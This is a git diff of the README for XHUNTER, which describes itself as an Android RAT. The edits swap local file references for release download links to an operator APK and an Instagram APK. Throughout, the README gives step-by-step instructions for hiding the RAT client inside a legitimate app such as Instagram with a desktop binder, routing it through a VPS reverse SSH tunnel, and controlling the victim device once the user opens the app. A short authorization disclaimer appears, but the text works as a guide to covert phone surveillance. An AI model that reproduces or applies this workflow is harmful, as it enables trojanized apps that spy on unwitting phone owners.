@@ -22,7 +22,7 @@
   <p align="center">
     Android research / admin tooling (v2 <strong>demo</strong> distribution) · RAT for Android 💀
     <br />
-    <a href="https://github.com/anirudhmalik/xhunter/releases">View release</a>
+    <a href="https://github.com/anirudhmalik/xhunter/releases/tag/v2.0-demo">View release (v2.0-demo)</a>
     ·
     <a href="https://github.com/anirudhmalik/xhunter/issues">Report bug</a>
     ·
@@ -41,13 +41,15 @@ Use of **XHUNTER** against people or systems **without** clear **authorization**
 
 **v2** is a new model vs older single-APK flows (e.g. `xhunter_1.6`–style all-in-one builds). Legacy in-app *build* flows were removed; the main repo is [anirudhmalik/xhunter](https://github.com/anirudhmalik/xhunter). This README focuses on:
 
-* A **host app** for your **operator** phone: **`xhunter-demo.apk`** (SSH **reverse** tunnel, client list, v2.0 **demo** badge in the UI).
+* A **host app** for your **operator** phone: download **[`xhunter_v2.0-demo.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0-demo/xhunter_v2.0-demo.apk)** from the **[v2.0-demo](https://github.com/anirudhmalik/xhunter/releases/tag/v2.0-demo)** release (SSH **reverse** tunnel, client list, v2.0 **demo** badge in the UI).
 * A **desktop binder** in **`binder/`** (Bash + Java JAR): merge the **client** into a **host APK** (e.g. Instagram). Binding on-device is not practical — use a PC.
 * A **VPS** (or similar) for reachability, **port / SSH** setup, and a **`HOST`** value shared by the binder and the app.
 
 [Demo vs pro](#features-demo-vs-pro) lists what the current demo build allows vs a future **pro**-style build.
 
 **Optional `config.txt` reference:** [binder/BINDER.md](binder/BINDER.md)
+
+**v2.0-demo release assets (GitHub):** [release page](https://github.com/anirudhmalik/xhunter/releases/tag/v2.0-demo) — **[`xhunter_v2.0-demo.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0-demo/xhunter_v2.0-demo.apk)** (operator app) · **[`instagram.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0-demo/instagram.apk)** (host app for the binder demo).
 
 <p align="right">(<a href="#top">back to top</a>)</p>
 
@@ -100,7 +102,7 @@ You need a **reachable server** and forwarding so a device running the merged ap
    sudo service sshd restart
    ```
 
-3. In **Xhunter** (with `xhunter-demo.apk`), set **host**, **user**, **password** (and ports) to match. After the tunnel is up, use the same **public IP** as **`HOST`** when building a merged client.
+3. In **Xhunter** (after installing [`xhunter_v2.0-demo.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0-demo/xhunter_v2.0-demo.apk) from the [v2.0-demo](https://github.com/anirudhmalik/xhunter/releases/tag/v2.0-demo) release), set **host**, **user**, **password** (and ports) to match. After the tunnel is up, use the same **public IP** as **`HOST`** when building a merged client.
 
 *Reverse* SSH: the device dials **out** to the server; the path is configured so the **host app** can accept the client. Exact ports are shown in the app.
 
@@ -116,7 +118,7 @@ You need a **reachable server** and forwarding so a device running the merged ap
    cd binder
    ```
 
-   You should see `setup.sh` and `config.txt` here, with `xhunter-demo.apk` in the **parent** directory (`..` from `binder`). *If you cloned to a custom folder name, `cd` into that folder before `cd binder`.*
+   You should see `setup.sh` and `config.txt` here. The **operator** APK is **not** part of the git tree — get **[`xhunter_v2.0-demo.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0-demo/xhunter_v2.0-demo.apk)** from **[v2.0-demo](https://github.com/anirudhmalik/xhunter/releases/tag/v2.0-demo)** and place it in the **repo root** next to `binder/` (`..` from `binder`) if you want it beside the project, or install it directly on the phone from the release. *If you cloned to a custom folder name, `cd` into that folder before `cd binder`.*
 
 2. **One time:**
 
@@ -125,7 +127,7 @@ You need a **reachable server** and forwarding so a device running the merged ap
    ./setup.sh
    ```
 
-3. Edit **`config.txt`:** set **`HOST`** to your **VPS IP**. The sample line **`HOST_APK=apps/instagram.apk`** expects a file at **`binder/apps/instagram.apk`**. This repo’s **`binder/apps/`** folder does **not** ship a host APK — obtain one yourself (e.g. download the Instagram Android APK, then save it as `instagram.apk` in `binder/apps/`). Example third-party link (use at your own risk; not affiliated): [download Instagram APK (Softonic)](https://instagram.en.softonic.com/android/download?ex=MATE-1430.0&rex=true). You can set **`HOST_APK`** to any path; see [binder/BINDER.md](binder/BINDER.md) for optional keys.
+3. Edit **`config.txt`:** set **`HOST`** to your **VPS IP**. The sample line **`HOST_APK=apps/instagram.apk`** expects **`binder/apps/instagram.apk`**. Download **[`instagram.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0-demo/instagram.apk)** from the same **[v2.0-demo](https://github.com/anirudhmalik/xhunter/releases/tag/v2.0-demo)** release and save it under `binder/apps/` (or set **`HOST_APK`** to any other path to your own host APK). See [binder/BINDER.md](binder/BINDER.md) for optional keys.
 
 4. Run (real terminal, not a pipe):
 
@@ -153,15 +155,15 @@ You need a **reachable server** and forwarding so a device running the merged ap
 
 8. Install that APK on the **test** device. The client often **connects only after** the user **opens the app**, **signs in** if required, and reaches the **home** screen.
 
-9. On the **operator** phone, install **`xhunter-demo.apk`** from the parent folder (`../xhunter-demo.apk`), enter **SSH** credentials, **start the tunnel**, wait for the client in the list. Details: [§3 below](#operator-app).
+9. On the **operator** phone, install **[`xhunter_v2.0-demo.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0-demo/xhunter_v2.0-demo.apk)** (from the [v2.0-demo](https://github.com/anirudhmalik/xhunter/releases/tag/v2.0-demo) release), enter **SSH** credentials, **start the tunnel**, wait for the client in the list. Details: [§3 below](#operator-app).
 
 ---
 
 <p id="operator-app"></p>
 
-### 3) Install `xhunter-demo.apk` — operator app
+### 3) Install `xhunter_v2.0-demo.apk` — operator app
 
-* Install **`xhunter-demo.apk`** (if **unknown sources** is blocked, your device vendor explains how to allow installs — e.g. [side-loading help](https://www.maketecheasier.com/install-apps-from-unknown-sources-android)).
+* Download and install **[`xhunter_v2.0-demo.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0-demo/xhunter_v2.0-demo.apk)** (asset on **[v2.0-demo](https://github.com/anirudhmalik/xhunter/releases/tag/v2.0-demo)**). If **unknown sources** is blocked, your device explains how to allow installs — e.g. [side-loading help](https://www.maketecheasier.com/install-apps-from-unknown-sources-android).
 * **Android 13+:** allow **notifications** for the tunnel foreground service if asked.
 * Open the app: **SSH** host, user, password, **ports** as shown; **save** a profile if you like; **start** the tunnel. When a merged device connects, it appears in the **client list**; in the **demo**, most modules show **Pro only** (see [Features](#features-demo-vs-pro)).
 * **v2.0 demo** badge, **Settings**, **About**, and in-app **legal** text.
@@ -174,8 +176,8 @@ You need a **reachable server** and forwarding so a device running the merged ap
 |------|------|
 | `README.md` | This file |
 | `images/logo.png` | Branding (referenced above) |
-| `xhunter-demo.apk` | Operator phone (host / SSH UI) |
-| `binder/apps/` | No host APK shipped — add your own file to match `HOST_APK` in `config.txt` |
+| **[`xhunter_v2.0-demo.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0-demo/xhunter_v2.0-demo.apk)** | Operator phone — get from **[v2.0-demo](https://github.com/anirudhmalik/xhunter/releases/tag/v2.0-demo)** |
+| **[`instagram.apk`](https://github.com/anirudhmalik/xhunter/releases/download/v2.0-demo/instagram.apk)** (for demo) | Place under `binder/apps/` if you use `HOST_APK=apps/instagram.apk` — same release |
 | `binder/` (rest) | `setup.sh`, `binder.sh`, `config.txt`, `vendor/`, etc. |
 | [binder/BINDER.md](binder/BINDER.md) | `config.txt` reference |
 
